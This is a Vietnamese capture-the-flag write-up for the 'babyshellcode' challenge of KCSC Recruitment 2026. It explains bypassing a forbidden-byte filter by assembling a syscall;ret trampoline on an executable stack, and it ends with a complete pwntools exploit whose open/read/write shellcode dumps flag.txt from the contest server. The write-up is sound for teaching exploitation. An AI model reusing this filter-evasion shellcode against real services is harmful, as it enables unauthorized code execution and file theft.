# babyshellcode---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài babyshellcode của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 14/12/2025

## 1. Mục tiêu cần làm
Chúng ta hãy check xem bài này có các lớp bảo vệ gì.

<img width="1230" height="280" alt="image" src="https://github.com/user-attachments/assets/ff139eca-8a81-4b41-9aff-14786f03ad97" />

Checksec cho thấy binary có đầy đủ các lớp bảo vệ như Canary, PIE và Full RELRO. Tuy nhiên, điểm yếu cốt lõi nằm ở dòng `Stack: Executable`. Điều này cho phép chúng ta thực thi mã máy nằm trên Stack. Đây là cơ sở để thực hiện kỹ thuật bypass bộ lọc syscall bằng cách sinh mã `0f 05` động và đẩy lên stack để chạy ( Stack Trampoline ).

Khi gọi được syscall thì chúng ta có thể tạo ra 1 shellcode đơn giản để băm em CPU này và ép em nó chạy shellcode của chúng ta thôi.


<img width="351" height="498" alt="image" src="https://github.com/user-attachments/assets/98aff5d2-3744-40c6-9186-7449e60acdaa" />


## 2. Cách thực thi
Bài này chúng ta không thể xài `0f 05` được tại vì code nếu nó thấy mình xài thì sẽ cấm.

```C
for ( i = 0; i < v6 - 1; ++i )
  {
    v4 = *(_WORD *)((char *)shellcode + i);
    if ( v4 == 1295 || v4 == 13327 || v4 == -32563 )
    {
      puts("Found forbidden bytes !!!");
      exit(1);
    }
  }
  ```

1295 hệ thập phân đổi sang hex sẽ là `0f 05`. Vậy thì chúng ta sẽ xài cái gì ? Đó là xài `0f 05 c3`. Cụm `0f 05 c`3 dịch ra mã máy ( assembly ) có nghĩa là :

```
syscall  ; ( 0f 05 ) - Gọi hệ điều hành
ret      ; ( c3 )    - Return ( Quay về nơi gọi )
```

Giờ chúng ta sẽ tạo 1 thằng shellcode trước. Thằng này có tác dụng như trạm thực thi vậy. Khi cần thực thi 1 đoạn shellcode nào đó chúng ta sẽ alo cho nó và nó sẽ thực thi cho mình.

```Python
trampoline = asm('''
    mov rbx, 0xC3050E
    inc rbx            
    push rbx           
    mov rbx, rsp       
''')
```

Chúng ta sẽ nạp `0xC3050E` vào rbx sau đó + 1 vào là lên `0xC3050F`. Chúng ta sẽ đẩy lệnh này lên stack ( vì stack được phép thực thi ) bằng lệnh `push rbx`. Sau đó chúng ta sẽ giữ số điện thoại của thằng trạm xử lí này `mov rbx, rsp` để có gì tí chúng ta `call rbx` là nó sẽ chạy luôn.

Giờ chúng ta sẽ tạo ra thêm 3 shellcode con lần lượt là : open, read, write. Giờ bắt đầu cook thôi.

Đầu tiên là thằng open.

```Python
hain_open = asm('''

    xor rax, rax
    push rax                       ; Đẩy NULL byte (\0) để kết thúc chuỗi

    mov rax, 0x7478742e67616c66    ; Chuỗi "flag.txt" dạng Hex
    push rax                       ; Đẩy lên stack
    
    mov rdi, rsp                   ; Arg1: filename (trỏ vào stack chứa "flag.txt")
    xor rsi, rsi                   ; Arg2: flags = O_RDONLY (0)
    xor rdx, rdx                   ; Arg3: mode = 0
    mov rax, 2                     ; Syscall number: SYS_OPEN (2)
    call rbx                       ; alo cho thằng trampoline
''')
```

Trong `C/Linux`, chuỗi phải kết thúc bằng ký tự `\0` ( NULL ). Ta `push 0` trước, sau đó push "flag.txt". Lúc này rsp trỏ vào đầu chuỗi flag.txt, và ngay sau đó là số `0`. Nếu không có bước này, hàm open sẽ đọc quá đà sang các ký tự rác và báo lỗi không tìm thấy file.

`call rbx`: Thay vì lệnh `syscall` ( bị global ban ), ta gọi `call rbx`. CPU nhảy lên Stack, thực hiện `syscall`, sau đó gặp `ret` thì quay về dòng code tiếp theo của chúng ta.

Tiếp theo là shellcode read.

```Python
chain_read = asm('''
    mov rdi, rax        ; Arg1: fd (Lấy từ kết quả open trả về trong rax)
    mov rsi, rsp        
    sub rsi, 0x100      ; Arg2: buffer (Lùi xuống vùng nhớ thấp hơn)
    mov rdx, 100        ; Arg3: count (Đọc 100 bytes)
    xor rax, rax        ; Syscall number: SYS_READ (0)
    call rbx            ; Gọi Trampoline
''')
```

**FD**: Hàm `open` trả về file descriptor ( thường là 0 vì `stdin` đã đóng ) vào thanh ghi `rax`. Ta chuyển nó sang `rdi` ( tham số thứ 1 của read ).

**Stack Pivot** ( `sub rsi, 0x100` ) : Đây là kỹ thuật quan trọng nhất. Nếu ta để `rsi = rsp` ( đọc ngay tại đỉnh stack ), dữ liệu file flag đọc vào sẽ ghi đè lên chính code shellcode hoặc địa chỉ trả về ( `return address` ) đang nằm trên stack.

Ta trừ `rsi` đi `0x100` byte để trỏ vùng đệm ( `buffer` ) xuống vùng nhớ trống an toàn bên dưới, tránh làm hỏng luồng thực thi ( tránh lỗi SIGSEGV ). Tại sao lại phải trừ đi `0x100` byte mà không phải `0x36` ?

Chúng ta thực hiện `sub rsi, 0x100` để trỏ vùng đệm ( `buffer `) xuống một vùng nhớ thấp hơn ( lower stack address ) chưa được sử dụng. Vì `read` sẽ ghi dữ liệu theo chiều tăng dần của bộ nhớ, nếu không lùi xuống, dữ liệu flag đọc vào sẽ ghi đè lên chính địa chỉ trả về ( `Return Address `) hoặc các chỉ thị ( `instruction `) đang nằm tại `rsp`, dẫn đến crash chương trình ngay lập tức. Các bạn có thể trừ `0x36` nếu nó đủ khoảng cách để dữ liệu flag không ghi đè lên địa chỉ trả về hoặc các chỉ thị đang nằm ở `rsp` là được.

Cuối cùng là shellcode write. Chúng ta sẽ ghi thẳng flag ra luôn.

```Python
chain_write = asm('''
    mov rdi, 1          ; Arg1: fd = 1 (STDOUT)
    mov rsi, rsp
    sub rsi, 0x100      ; Arg2: buffer (Lấy đúng chỗ đã lưu lúc nãy)
    mov rdx, 100        ; Arg3: count
    mov rax, 1          ; Syscall number: SYS_WRITE (1)
    call rbx            ; Gọi Trampoline
''')
```

Shellcode này không có gì để nói hết nên chúng ta đến phần cuối là gửi payload.

```Python
shellcode = trampoline + chain_open + chain_read + chain_write

p = remote('67.223.119.69', 5023)

p.send(shellcode)

p.interactive()
```

Vậy là xong chúng ta đã bắt em CPU in ra flag cho chúng ta rồi. Bài này rất đúng với tên gọi của nó, khá dễ ( dễ cút ). Hãy cho mình 1 star để mình có động lực viết tiếp nha 🐧. Giờ thì 🗣️ " Hey siri hãy nổ tung shell đi !!! ".

<img width="736" height="740" alt="image" src="https://github.com/user-attachments/assets/84594200-4e85-4f78-baa6-f7ef09217abb" />

## 3. Exploit
```Python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

trampoline = asm('''

    mov rbx, 0xC3050E
    inc rbx             
    push rbx            
    mov rbx, rsp        
''')


chain_open = asm('''
    xor rax, rax
    push rax

    mov rax, 0x7478742e67616c66
    push rax
    
    mov rdi, rsp      
    xor rsi, rsi       
    xor rdx, rdx        
    mov rax, 2         
    call rbx           
''')


chain_read = asm('''
    mov rdi, rax        
    mov rsi, rsp
    sub rsi, 0x100      
    mov rdx, 100        
    xor rax, rax        
    call rbx
''')

chain_write = asm('''
    mov rdi, 1         
    mov rsi, rsp
    sub rsi, 0x100      
    mov rdx, 100        
    mov rax, 1          
    call rbx
''')

shellcode = trampoline + chain_open + chain_read + chain_write

p = remote('67.223.119.69', 5023)

p.send(shellcode)

p.interactive()
```
